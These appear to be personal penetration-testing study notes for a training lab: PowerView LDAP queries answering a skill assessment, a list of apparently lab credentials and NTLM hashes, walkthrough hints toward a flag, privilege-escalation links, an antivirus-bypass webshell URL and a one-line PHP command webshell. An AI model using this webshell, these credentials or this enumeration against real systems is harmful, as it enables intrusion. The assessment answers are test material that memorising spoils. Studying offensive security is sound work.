```c
h

---
---
LDAP Skill Assessment

```c
# Q1
Get-DomainUser -LDAPFilter "(userAccountControl=262656)" | Select samaccountname, useraccountcontrol, distinguishedname

# Q2
Get-DomainUser -Domain INLANEFREIGHTENUM1.LOCAL `
  -LDAPFilter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" `
  | Select samaccountname, useraccountcontrol, distinguishedname

# Q3 
(Get-DomainGroup -Identity "IT Support" -Domain INLANEFREIGHTENUM1.LOCAL -Properties memberof).memberof |
    ForEach-Object { ($_ -split ',')[0] -replace '^CN=' }

# Q4
$g='Server Technicians'; $direct=(Get-DomainGroupMember $g | ? {$_.MemberObjectClass -eq 'user'} | % MemberSID); Get-DomainGroupMember $g -Recurse | ? {$_.MemberObjectClass -eq 'user' -and ($_.MemberSID -notin $direct)} | % { Get-DomainUser -Identity $_.MemberSID -Properties givenName,sn,samAccountName } | % { if($_.givenName -and $_.sn){"$($_.givenName).$($_.sn)"} else { $_.samAccountName } }

# Q5
(Get-DomainUser -SearchBase "OU=Former Employees,DC=INLANEFREIGHTENUM1,DC=LOCAL").Count

# Q6
$d='INLANEFREIGHTENUM1.LOCAL'
Get-DomainComputer -Domain $d -LDAPFilter "(name=RD*)" -Properties dNSHostName,name |
  ForEach-Object { if ($_.dNSHostName) { $_.dNSHostName } else { "$($_.name).$d" } } |
  ForEach-Object { $_.ToUpper() }

# Q7
(Get-ADGroup -LDAPFilter "(adminCount=1)").Count

# Q8
Get-DomainUser -Domain INLANEFREIGHTENUM1.LOCAL -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' | select samaccountname,distinguishedname

# Q9
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname

# Q10
(Get-DomainPolicy).PrivilegeRights
```
---
---
```c
[+] INLANEFREIGHT.LOCAL\Juliette:Password1
[+] Atul\hooters1
[+] SQL01\sqldev:Sq!D3vUs3R
Welcome1
administrator : MyG00dandSecureP@$$Word

admiinistartor : aa8058d010273e4a9c5043280a84b2bb
SQL01$ : d92707cc5c2c85a061517c750fc4ead1
```

```c
than use get-file to get whatever you found in the dev share.

This will get you to the SQL01

Than try SELECT * FROM [interns].[dbo].details

But also there is the flag on that machine, you will have to priv than impersonate and more c:\Users\Public\flag.txt

So 2 things you will get so you can continue.
```




- [ ] add xampp to my notes

https://github.com/n0xturne/OSCP-Cheat-Sheet-2024

https://medium.com/@nomanramzan91/muhammad-nomans-oscp-journey-a-comprehensive-review-110-and-tips-in-12-hours-57c8ee2c1a3d

.htaccess


https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/

https://www.hackingarticles.in/red-teaming/
https://www.hackingarticles.in/penetration-testing/

https://raw.githubusercontent.com/yayip/aspx-webshell-antivirus-bypass/refs/heads/main/aspx_bypass_av.aspx

exploits like pwnkit
.git exploits

SeMachineAccountPrivilege -> exploit it using nopac https://www.hackingarticles.in/windows-privilege-escalation-samaccountname-spoofing/


check all the windows privilege escalation methods


add all web extensions in web methodology
make a custom wordlist for authentication bypass
sqli , nosqli etc 

<?php system($_GET[“cmd”]);?>
```


----
---
#### Modules

- [ ] DACL 1 - Skill Assessment
- [ ] BloodHound - Custom Queries
- [ ] Footprinting Skill assessment
- [ ] Wordpress
- [ ] Attacking Enterprise Network
- [ ] File Upload Attacks
- [ ] LFI/RFI
	- [ ] dont forget to add windows notes
- [ ] .htaccess
- [ ] XSS
#### Machines To Solve

- [ ] Attacking Enterprise Network
#### Ideas

- [ ] automate web enumeration ? 
- [ ] edit my notes

